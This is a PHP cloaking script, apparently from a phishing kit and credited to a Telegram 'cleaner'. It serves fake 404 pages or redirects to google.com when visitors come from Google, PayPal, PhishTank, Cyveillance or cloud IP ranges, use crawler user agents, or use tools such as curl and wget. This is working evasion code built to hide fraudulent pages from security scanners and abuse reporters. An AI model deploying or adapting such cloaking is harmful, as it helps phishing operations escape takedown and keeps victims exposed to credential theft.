<?php
//** Cleaned by M3dcoder telegram : https://t.me/M3dL4m1n3 **//
// Banned IPs
$banned_ips = array('1.0.0.0/8', '10.0.0.0/8', '127.0.0.0/8', '169.254.0.0/16', '172.16.0.0/12', '192.0.2.0/24', '192.168.0.0/16', '198.18.0.0/15', '198.51.100.0/24', '203.0.113.0/24', '224.0.0.0/4', '240.0.0.0/4', '255.255.255.255', '1.2.3.4', '5.6.7.8', '^66.102.*.*', '^38.100.*.*', '^107.170.*.*', '^149.20.*.*', '^38.105.*.*', '^74.125.*.*',  '^66.150.14.*', '^54.176.*.*', '^38.100.*.*', '^184.173.*.*', '^66.249.*.*', '^128.242.*.*', '^72.14.192.*', '^208.65.144.*', '^74.125.*.*', '^209.85.128.*', '^216.239.32.*', '^74.125.*.*', '^207.126.144.*', '^173.194.*.*', '^64.233.160.*', '^72.14.192.*', '^66.102.*.*', '^64.18.*.*', '^194.52.68.*', '^194.72.238.*', '^62.116.207.*', '^212.50.193.*', '^69.65.*.*', '^50.7.*.*', '^131.212.*.*', '^XMR.*.*', '^93.172.*.*', '^109.186.*.*', '^194.90.*.*', '^212.29.192.*', '^212.29.224.*', '^212.143.*.*', '^212.150.*.*', '^212.235.*.*', '^217.132.*.*', '^50.97.*.*', '^217.132.*.*', '^209.85.*.*', '^66.205.64.*', '^204.14.48.*', '^64.27.2.*', '^67.15.*.*', '^202.108.252.*', '^193.XMR.252.167.*', '^193.253.199.*', '^69.61.12.*', '^64.37.103.*', '^38.144.36.*', '^64.124.14.*', '^206.28.72.*', '^209.73.228.*', '^158.108.*.*', '^168.188.*.*', '^66.207.120.*', '^167.24.*.*', '^192.118.48.*', '^67.209.128.*', '^12.148.209.*', '^12.148.196.*', '^193.220.178.*', '68.65.53.71', '^198.25.*.*', '^64.106.213.*'); // Add your banned IP addresses
if (in_array($_SERVER['REMOTE_ADDR'], $banned_ips)) {
    header("HTTP/1.0 404 Not Found");
    echo "404 Not Found";
    exit();
}

// Blocked hostnames
$blocked_words = array('above','google','softlayer','amazonaws','cyveillance','phishtank','dreamhost','netpilot','calyxinstitute','tor-exit', 'paypal', 'phishing', 'malware', 'spyware', 'botnet', 'exploit', 'ransomware', 'ddos', 'trojan', 'virus', 'worm', 'backdoor', 'rootkit', 'bad', 'hacker', 'spam'); // Add your blocked words
$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
foreach ($blocked_words as $word) {
    if (strpos($host, $word) !== false) {
        header("HTTP/1.0 404 Not Found");
        echo "404 Not Found";
        exit();
    }
}

// User agent validation
$blocked_agents = array('Googlebot', 'Bingbot', 'Yahoo! Slurp', 'DuckDuckBot', 'Baiduspider', 'YandexBot', 'Sogou Spider', 'Exabot', 'Facebot', 'MJ12bot', 'AhrefsBot', 'DotBot', 'Alexa', 'SemrushBot', 'Majestic-12', 'TurnitinBot', 'ZoominfoBot', 'SEOkicks-Robot', 'SeznamBot', 'Lycos', 'Cliqzbot', 'CCBot', 'LinkpadBot', 'Wotbox', 'ScoutJet', 'PiplBot', 'SearchmetricsBot', 'Sistrix', 'XoviBot', 'CommonCrawler', 'WISENutbot', 'Python-urllib', 'HttpComponents', 'libwww-perl', 'PHP', 'Ruby', 'Python-requests', 'wget', 'cURL', 'Powershell', 'Perl', 'google', 'msnbot', 'Yahoo! Slurp', 'YahooSeeker', 'Googlebot', 'bingbot', 'PycURL', 'facebookexternalhit', 'curl', 'wget', 'libwww', 'python-requests', 'httpie', 'java', 'powershell', 'perl', 'ruby', 'php', 'bot', 'crawler', 'spider', 'google', 'msnbot', 'Yahoo! Slurp', 'YahooSeeker', 'Googlebot', 'bingbot', 'PycURL', 'facebookexternalhit', 'curl', 'wget', 'libwww', 'python-requests', 'httpie', 'java', 'powershell', 'perl', 'ruby', 'php', 'bot', 'crawler', 'spider'); // Add your blocked user agents
$user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
foreach ($blocked_agents as $agent) {
    if (strpos($user_agent, $agent) !== false) {
        header("HTTP/1.0 404 Not Found");
        echo "404 Not Found";
        exit();
    }
}

//////////////////////////////////////// ////////////////////////////////////////
//////////////////////////////////////// ////////////////////////////////////////
//////////////////////////////////////// ////////////////////////////////////////
   
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array("above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit", "paypal");
foreach($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
    header('Location: https://google.com/');
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");

    }  
}
$bannedIP = array(
"^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^XMR.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.XMR.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*");
if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
     header('Location: https://google.com/');
     exit();
} else {
     foreach($bannedIP as $ip) {
          if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
               header('Location: https://google.com/');
               die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
          }
     }
}

if(strpos($_SERVER['HTTP_USER_AGENT'], 'google') or strpos($_SERVER['HTTP_USER_AGENT'], 'msnbot') or strpos($_SERVER['HTTP_USER_AGENT'], 'Yahoo! Slurp') or strpos($_SERVER['HTTP_USER_AGENT'], 'YahooSeeker') or strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') or strpos($_SERVER['HTTP_USER_AGENT'], 'bingbot') or strpos($_SERVER['HTTP_USER_AGENT'], 'crawler') or strpos($_SERVER['HTTP_USER_AGENT'], 'PycURL') or strpos($_SERVER['HTTP_USER_AGENT'], 'facebookexternalhit') !== false) { header('Location: https://google.com/'); exit; }

?>